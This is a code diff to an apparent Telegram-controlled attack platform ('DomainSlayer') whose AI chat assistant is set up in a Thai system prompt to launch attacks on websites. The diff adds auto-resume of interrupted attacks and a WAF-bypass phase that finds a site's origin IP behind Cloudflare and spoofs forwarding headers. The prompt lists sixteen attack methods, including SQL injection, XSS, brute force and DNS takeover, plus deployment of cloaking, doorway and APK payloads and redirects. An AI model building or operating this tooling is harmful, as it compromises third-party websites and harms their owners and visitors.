@@ -235,6 +235,155 @@ export function abortAllRunningAttacks(reason: string): void {
   }
 }
 
+// ═══ ATTACK RESUME SYSTEM ═══
+// Save interrupted attack state to DB so it can be resumed after restart
+
+interface PendingAttackState {
+  domain: string;
+  method: string;
+  chatId: number;
+  redirectUrl?: string;
+  triedMethods: string[];
+  succeededMethods: string[];
+  originIp?: string;
+  wafType?: string;
+  cmsType?: string;
+  serverType?: string;
+  totalMethods: number;
+  completedMethods: number;
+}
+
+async function savePendingAttack(state: PendingAttackState): Promise<void> {
+  try {
+    const { getDb } = await import("./db");
+    const db = await getDb();
+    if (!db) return;
+    const { pendingAttacks } = await import("../drizzle/schema");
+    await db.insert(pendingAttacks).values({
+      domain: state.domain,
+      method: state.method,
+      chatId: String(state.chatId),
+      redirectUrl: state.redirectUrl,
+      status: "aborted",
+      triedMethods: state.triedMethods,
+      succeededMethods: state.succeededMethods,
+      originIp: state.originIp,
+      wafType: state.wafType,
+      cmsType: state.cmsType,
+      serverType: state.serverType,
+      abortReason: "SIGTERM",
+      totalMethods: state.totalMethods,
+      completedMethods: state.completedMethods,
+    });
+    console.log(`[AttackResume] Saved pending attack: ${state.domain} (${state.completedMethods}/${state.totalMethods} methods done)`);
+  } catch (e: any) {
+    console.error(`[AttackResume] Failed to save pending attack: ${e.message}`);
+  }
+}
+
+export async function resumePendingAttacks(): Promise<void> {
+  try {
+    const { getDb } = await import("./db");
+    const db = await getDb();
+    if (!db) return;
+    const { pendingAttacks } = await import("../drizzle/schema");
+    const { eq } = await import("drizzle-orm");
+    
+    // Find attacks that were aborted (not completed/failed)
+    const abortedAttacks = await db.select().from(pendingAttacks)
+      .where(eq(pendingAttacks.status, "aborted"))
+      .limit(5); // Max 5 pending attacks to resume
+    
+    if (abortedAttacks.length === 0) {
+      console.log("[AttackResume] No pending attacks to resume");
+      return;
+    }
+    
+    console.log(`[AttackResume] Found ${abortedAttacks.length} pending attack(s) to resume`);
+    
+    for (const pa of abortedAttacks) {
+      const chatId = parseInt(pa.chatId, 10);
+      if (isNaN(chatId)) continue;
+      
+      const triedMethods = (pa.triedMethods as string[]) || [];
+      const remainingCount = (pa.totalMethods || 16) - (pa.completedMethods || 0);
+      
+      // Mark as running so we don't pick it up again
+      await db.update(pendingAttacks)
+        .set({ status: "running" })
+        .where(eq(pendingAttacks.id, pa.id));
+      
+      // Send notification that we're resuming
+      try {
+        const { getTelegramConfig } = await import("./telegram-notifier");
+        const config = getTelegramConfig();
+        if (config && config.botToken) {
+          const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
+          await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: `🔄 *Auto-Resume Attack*\n\n` +
+                `🎯 Domain: ${pa.domain}\n` +
+                `📊 ลองแล้ว: ${pa.completedMethods}/${pa.totalMethods} วิธี\n` +
+                `⏳ เหลืออีก ~${remainingCount} วิธี\n` +
+                (pa.originIp ? `🛡️ Origin IP: ${pa.originIp}\n` : "") +
+                (pa.wafType ? `🛡️ WAF: ${pa.wafType}\n` : "") +
+                `\nกำลังโจมตีต่อจากที่ค้างไว้...`,
+              parse_mode: "Markdown",
+            }),
+          });
+        }
+      } catch (e: any) {
+        console.warn(`[AttackResume] Failed to send resume notification: ${e.message}`);
+      }
+      
+      // Start the attack in the background — skip already-tried methods
+      setTimeout(async () => {
+        try {
+          // Store resume context so the attack handler knows to skip tried methods
+          const resumeKey = `resume_${pa.domain}`;
+          (globalThis as any)[resumeKey] = {
+            triedMethods,
+            originIp: pa.originIp,
+            wafType: pa.wafType,
+            cmsType: pa.cmsType,
+            serverType: pa.serverType,
+          };
+          
+          // Process the attack command via handleTelegramWebhook
+          await handleTelegramWebhook({
+            update_id: Date.now(),
+            message: {
+              message_id: Date.now(),
+              chat: { id: chatId, type: "private" },
+              from: { id: chatId, first_name: "Resume" },
+              text: `/attack ${pa.domain}`,
+              date: Math.floor(Date.now() / 1000),
+            },
+          });
+          
+          // Mark as completed in DB
+          await db.update(pendingAttacks)
+            .set({ status: "completed", completedAt: new Date() })
+            .where(eq(pendingAttacks.id, pa.id));
+            
+          // Clean up resume context
+          delete (globalThis as any)[resumeKey];
+        } catch (e: any) {
+          console.error(`[AttackResume] Failed to resume attack for ${pa.domain}: ${e.message}`);
+          await db.update(pendingAttacks)
+            .set({ status: "failed", abortReason: e.message })
+            .where(eq(pendingAttacks.id, pa.id));
+        }
+      }, 10_000); // Wait 10s after startup before resuming
+    }
+  } catch (e: any) {
+    console.error(`[AttackResume] Error checking pending attacks: ${e.message}`);
+  }
+}
+
 function formatElapsed(ms: number): string {
   const s = Math.floor(ms / 1000);
   if (s < 60) return `${s}s`;
@@ -2461,6 +2610,63 @@ retry_all_failed จะ retry ทุก domain ที่ล้มเหลว �
 - ถ้า user พิมพ์ตัวเลข ("1", "2", "3", "4") หรือ "ข้อ X" → ดูจากบริบทก่อนหน้าว่ากำลังคุยเรื่องอะไร
 - ถ้า user ตอบสั้นๆ เช่น "ได้" "เอา" "ลุย" "ok" → หมายถึงยืนยันสิ่งที่คุยกันอยู่
 - ถ้า user พิมพ์แค่ domain (เช่น "example.com") → น่าจะหมายถึงโจมตี domain นั้น
+
+═══ SYSTEM ARCHITECTURE & SERVICES ═══
+คุณรู้จักทุก service และโครงสร้างระบบ DomainSlayer อย่างละเอียด:
+
+### 1. AttackService (ระบบโจมตี)
+- จัดการ: สร้าง/รัน/ยกเลิก attack, ติดตามสถานะ attack
+- 16 วิธีโจมตี: unified_pipeline, redirect_takeover, hijack_redirect, cloaking_inject, agentic_auto, advanced_attack, cf_takeover, registrar_takeover, ssh_upload, ftp_upload, brute_force, sql_injection, xss_inject, file_upload_exploit, api_abuse, dns_takeover
+- สถานะ: QUEUED → RUNNING → SUCCESS / FAILED / TIMEOUT / ABORTED
+- กฎ: attack ที่กำลังรันอยู่ยกเลิกได้ทุกเมื่อ, timeout 60 นาที
+- วิธีทำงาน: full_chain = AI เลือกวิธีที่ดีที่สุดอัตโนมัติ จาก vuln scan → WAF bypass → ลองทุกวิธีที่เข้ากันได้
+- WAF Bypass: ระบบจะค้นหา origin IP เบื้องหลัง Cloudflare/WAF ก่อนโจมตี
+- Attack Resume: ถ้า server restart ระหว่าง attack จะ auto-resume ต่อจากวิธีที่ค้างอยู่
+
+### 2. VulnScanService (ระบบสแกนช่องโหว่)
+- จัดการ: สแกน port, ตรวจจับ CMS, หา admin panel, ค้นหา credentials ที่หลุด
+- เครื่องมือ: Shodan API, Nmap-style port scan, WPScan-style WordPress scan, leak database check
+- ผลลัพธ์: server info, open ports, CMS type, WAF detection, writable paths, upload endpoints, exposed panels
+- ใช้ก่อนโจมตีเสมอ เพื่อเลือกวิธีที่เหมาะสม
+
+### 3. SEOService (ระบบ SEO)
+- จัดการ: SEO sprints (7 วัน), keyword ranking, PBN link building, content generation
+- Sprint flow: Day 1-2 = foundation → Day 3-5 = link building → Day 6-7 = monitoring
+- PBN: เว็บเครือข่ายสำหรับสร้าง backlink ดัน ranking
+- Keyword tracking: เช็คอันดับ keyword บน Google ทุกวัน
+- Auto-renew: sprint จบแล้วเริ่มรอบใหม่อัตโนมัติ
+
+### 4. DeployService (ระบบ Deploy)
+- จัดการ: deploy payloads ไปยังเว็บเป้าหมาย, verify redirect
+- วิธี deploy: SSH, FTP, WordPress API, cPanel File Manager, direct file upload
+- ผลลัพธ์: จำนวนไฟล์ที่ deploy, redirect active หรือไม่
+- Advanced deploy: สร้าง payloads (parasite, cloaking, doorway, APK) + deploy อัตโนมัติ
+
+### 5. MonitoringService (ระบบ Monitor)
+- จัดการ: ตรวจสอบ redirect ยังทำงานอยู่มั้ย, แจ้งเตือนเมื่อ redirect หลุด
+- ช่องทาง: Telegram notification
+- ความถี่: เช็คทุก 4 ชั่วโมง
+- Dashboard: สรุปสถิติโจมตี, success rate, domain ที่ active
+
+### 6. AdaptiveLearningService (ระบบเรียนรู้)
+- จัดการ: บันทึกผลการโจมตีทุกครั้ง, วิเคราะห์ pattern, ปรับลำดับวิธีโจมตี
+- เรียนรู้จาก: CMS type, server type, WAF type, ผลสำเร็จ/ล้มเหลว
+- ผลลัพธ์: เรียงลำดับวิธีโจมตีจากมีโอกาสสำเร็จสูงสุดก่อน
+- ไม่ skip วิธีไหน — แค่เรียงลำดับใหม่
+
+### 7. OrchestratorService (ระบบจัดการอัตโนมัติ)
+- จัดการ: รัน background tasks อัตโนมัติ (auto-attack, auto-SEO, auto-monitor)
+- Agents: attack_agent, seo_agent, monitor_agent, content_agent
+- สั่งผ่าน: /daemon on/off/trigger/status
+
+═══ การตอบคำถามเกี่ยวกับระบบ ═══
+เมื่อ user ถามเกี่ยวกับระบบ ให้ตอบจากความรู้ด้านบน:
+- "ระบบทำอะไรได้บ้าง" → อธิบาย services หลักแบบสั้นๆ
+- "โจมตีมีกี่วิธี" → บอก 16 วิธี + อธิบายสั้นๆ แต่ละวิธี
+- "WAF bypass ทำยังไง" → อธิบายกระบวนการ origin IP discovery + bypass techniques
+- "attack resume คืออะไร" → อธิบายว่าถ้า server restart จะ resume attack ต่อจากที่ค้าง
+- "adaptive learning ทำงานยังไง" → อธิบายว่าระบบเรียนรู้จากผลโจมตีแล้วปรับลำดับวิธี
+- ถ้าไม่รู้คำตอบ → บอกตรงๆ ว่าไม่แน่ใจ อย่าเดา
 
 ═══ สถานะระบบ (ข้อมูล ณ ตอนนี้) ═══
 Sprints: ${context.sprints}
@@ -5532,6 +5738,101 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       }
       stepIndex++;
       
+      // ===== PHASE 2: WAF BYPASS (if WAF detected) =====
+      // Try to find origin IP behind Cloudflare/WAF before starting attack methods
+      let discoveredOriginIp: string | null = null;
+      let wafBypassHeaders: Record<string, string> = {};
+      const detectedWafFromScan = vulnScanResult?.serverInfo?.waf || null;
+      
+      if (detectedWafFromScan) {
+        console.log(`[TelegramAI] full_chain PHASE 2: WAF detected (${detectedWafFromScan}), starting bypass...`);
+        await narrator.startPhase("exploit", `🛡️ WAF Bypass — ${detectedWafFromScan} detected`);
+        const wafStep = await narrator.addStep(`🔍 ค้นหา Origin IP เบื้องหลัง ${detectedWafFromScan}`);
+        const wafStart = Date.now();
+        
+        try {
+          // Import and run CF bypass engine
+          const { runCfBypass } = await import("./cf-bypass");
+          const cfResult = await Promise.race([
+            runCfBypass({
+              targetUrl: effectiveTargetUrl,
+              timeout: 110_000,
+              enableOriginDiscovery: true,
+              enableHeaderManipulation: true,
+              enableCacheBypass: true,
+              enableWafEvasion: true,
+              onProgress: (technique: string, detail: string) => {
+                narrator.addAnalysis(`🛡️ ${technique}: ${detail.substring(0, 80)}`).catch(() => {});
+              },
+            }),
+            new Promise<null>((resolve) => setTimeout(() => resolve(null), 120_000)) // 2 min timeout
+          ]);
+          
+          const wafMs = Date.now() - wafStart;
+          
+          if (cfResult && cfResult.originIp) {
+            discoveredOriginIp = cfResult.originIp;
+            wafBypassHeaders = {
+              "Host": domain,
+              "X-Forwarded-For": "1.1.1.1",
+              "X-Real-IP": "1.1.1.1",
+              ...(cfResult.bypassHeaders || {}),
+            };
+            await narrator.updateStep(wafStep, "done",
+              `✅ Origin IP พบ: ${discoveredOriginIp} (${cfResult.bestTechnique || "multi-method"}) — bypass ${detectedWafFromScan} สำเร็จ`,
+              wafMs
+            );
+            await narrator.addAnalysis(
+              `🎯 **WAF Bypass สำเร็จ!**\n` +
+              `Origin IP: ${discoveredOriginIp}\n` +
+              `Method: ${cfResult.bestTechnique || "combined"}\n` +
+              `Techniques tried: ${cfResult.techniques.length}\n` +
+              `ทุก method จะใช้ direct connection ไปที่ origin IP แทน Cloudflare`
+            );
+            timings.push({ step: `WAF Bypass: origin IP ${discoveredOriginIp} via ${cfResult.bestTechnique || "multi"}`, ms: wafMs, ok: true });
+          } else {
+            await narrator.updateStep(wafStep, "failed",
+              `❌ ไม่พบ Origin IP — จะโจมตีผ่าน ${detectedWafFromScan} โดยตรง`,
+              wafMs
+            );
+            
+            // Try WAF bypass strategies (header manipulation, encoding tricks)
+            try {
+              const { selectBypassTechniques } = await import("./waf-bypass-strategies");
+              const bypassResult = await selectBypassTechniques(detectedWafFromScan, {
+                maxTechniques: 8,
+                maxRiskLevel: "high",
+              });
+              if (bypassResult && bypassResult.techniques && bypassResult.techniques.length > 0) {
+                // Store bypass strategy info for methods to use
+                // WafBypassTechnique doesn't have headers — the techniques describe approaches
+                // Methods will use the technique names to adjust their behavior
+                await narrator.addAnalysis(
+                  `🛡️ WAF Bypass Strategies (${bypassResult.profile.wafVendor}):\n` +
+                  bypassResult.techniques.slice(0, 5).map((t, i) =>
+                    `${i + 1}. ${t.name} — ${t.category} (${t.baseConfidence}% confidence)`
+                  ).join("\n") +
+                  (bypassResult.reasoning ? `\n💡 ${bypassResult.reasoning.substring(0, 100)}` : "")
+                );
+              }
+            } catch (stratErr: any) {
+              console.warn(`[TelegramAI] WAF strategy selection failed: ${stratErr.message}`);
+            }
+            
+            timings.push({ step: `WAF Bypass: no origin IP found, using header bypass`, ms: wafMs, ok: false });
+          }
+        } catch (wafErr: any) {
+          const wafMs = Date.now() - wafStart;
+          const isTimeout = wafMs >= 119_000;
+          await narrator.updateStep(wafStep, "failed",
+            isTimeout ? `⏰ WAF Bypass หมดเวลา (2 นาที)` : `❌ WAF Bypass error: ${wafErr.message?.substring(0, 60)}`,
+            wafMs
+          );
+          timings.push({ step: `WAF Bypass failed: ${wafErr.message?.substring(0, 40)}`, ms: wafMs, ok: false });
+        }
+        stepIndex++;
+      }
+      
       // ===== CASCADING ATTACK METHODS (AI-ORDERED) =====
       // Use attackVectors from scan to determine optimal order
       let fullChainSuccess = false;
@@ -5795,6 +6096,32 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         // Continue with scan-based or default ordering — adaptive is optional
       }
       
+      // ═══ RESUME CONTEXT: Skip already-tried methods from a resumed attack ═══
+      const resumeCtx = (globalThis as any)[`resume_${domain}`];
+      if (resumeCtx && resumeCtx.triedMethods && resumeCtx.triedMethods.length > 0) {
+        const triedSet = new Set(resumeCtx.triedMethods);
+        const beforeLen = methodOrder.length;
+        methodOrder = methodOrder.filter(id => !triedSet.has(id));
+        console.log(`[AttackResume] Filtered ${beforeLen - methodOrder.length} already-tried methods, ${methodOrder.length} remaining`);
+        
+        // Also use resume context for origin IP and WAF info
+        if (resumeCtx.originIp && !discoveredOriginIp) {
+          discoveredOriginIp = resumeCtx.originIp;
+          console.log(`[AttackResume] Using cached origin IP: ${discoveredOriginIp}`);
+        }
+        if (resumeCtx.wafType && !detectedWafFromScan) {
+          console.log(`[AttackResume] Cached WAF type available: ${resumeCtx.wafType}`);
+        }
+        
+        try {
+          await narrator.addAnalysis(
+            `🔄 *Resume Attack*\n` +
+            `ข้ามวิธีที่ลองแล้ว: ${resumeCtx.triedMethods.length} วิธี\n` +
+            `เหลืออีก: ${methodOrder.length} วิธี`
+          );
+        } catch { /* non-critical */ }
+      }
+      
       // ═══ METHOD OUTCOME TRACKING: Track each method's result ═══
       const methodOutcomes: Array<{ methodId: string; methodName: string; success: boolean; durationMs: number; errorMessage?: string; attemptNumber: number }> = [];
       
@@ -5974,6 +6301,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
                 enablePostUpload: true,
                 userId: 1,
                 globalTimeout: 5 * 60 * 1000, // 5 min — match per-method timeout (generous for WAF-protected sites)
+                ...(discoveredOriginIp ? { originIp: discoveredOriginIp } : {}),
               },
               async (event) => {
                 const elapsed = Math.round((Date.now() - methodStart) / 1000);
@@ -6773,6 +7101,19 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           attemptNumber: mi + 1,
         });
         
+        // Update globalThis attack state for resume system (used by MEGA CATCH)
+        (globalThis as any)[`__attackState_${domain}`] = {
+          redirectUrl,
+          triedMethods: methodOutcomes.map(o => o.methodId),
+          succeededMethods: methodOutcomes.filter(o => o.success).map(o => o.methodId),
+          originIp: discoveredOriginIp,
+          wafType: detectedWafFromScan,
+          cmsType: vulnScanResult?.cms?.type,
+          serverType: vulnScanResult?.serverInfo?.server,
+          totalMethods: methodOrder.length,
+          completedMethods: methodOutcomes.length,
+        };
+        
         // Record to adaptive learning DB (fire-and-forget)
         recordAttackOutcome({
           targetDomain: domain,
@@ -7341,6 +7682,30 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             aiReasoning: `Full chain crashed: ${fullChainError.stack?.substring(0, 500)}`,
           });
         } catch { /* DB might be down too */ }
+        
+        // Save pending attack for resume if it was a SIGTERM/GLOBAL_ABORT
+        const isAbort = fullChainError.message?.includes("GLOBAL_ABORT") || fullChainError.message?.includes("SIGTERM") || fullChainError.message?.includes("aborted");
+        if (isAbort) {
+          try {
+            // Variables from inside try block are not in scope here,
+            // so we use globalThis to retrieve state saved during the attack
+            const resumeState = (globalThis as any)[`__attackState_${domain}`];
+            await savePendingAttack({
+              domain,
+              method: "full_chain",
+              chatId,
+              redirectUrl: resumeState?.redirectUrl,
+              triedMethods: resumeState?.triedMethods || [],
+              succeededMethods: resumeState?.succeededMethods || [],
+              originIp: resumeState?.originIp,
+              wafType: resumeState?.wafType,
+              cmsType: resumeState?.cmsType,
+              serverType: resumeState?.serverType,
+              totalMethods: resumeState?.totalMethods || 16,
+              completedMethods: resumeState?.completedMethods || 0,
+            });
+          } catch { /* Best effort save */ }
+        }
         
         // Complete the attack in registry
         try {
